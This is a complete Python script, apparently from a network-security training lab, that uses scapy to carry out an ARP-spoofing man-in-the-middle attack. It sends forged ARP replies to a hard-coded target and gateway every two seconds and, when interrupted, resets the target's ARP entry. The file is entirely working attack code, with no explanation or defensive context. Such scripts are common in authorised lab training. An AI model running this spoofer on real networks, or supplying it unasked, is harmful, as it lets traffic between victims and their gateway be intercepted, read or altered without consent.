#!/usr/bin/env python
import scapy.all as scapy
import time

def getMAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_r_b = broadcast/arp_request
    answered = scapy.srp(arp_r_b, verbose=False, timeout=1)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = getMAC(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = getMAC(target_ip)
    spoof_mac = getMAC(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, verbose=False, count=4)

target_ip = "10.0.2.13"
gateway_ip = "10.0.2.1"
count =0

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        count = count + 2
        print("\r Packets Sent: " + str(count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("Program Executed Successfully")
    restore(target_ip,gateway_ip)

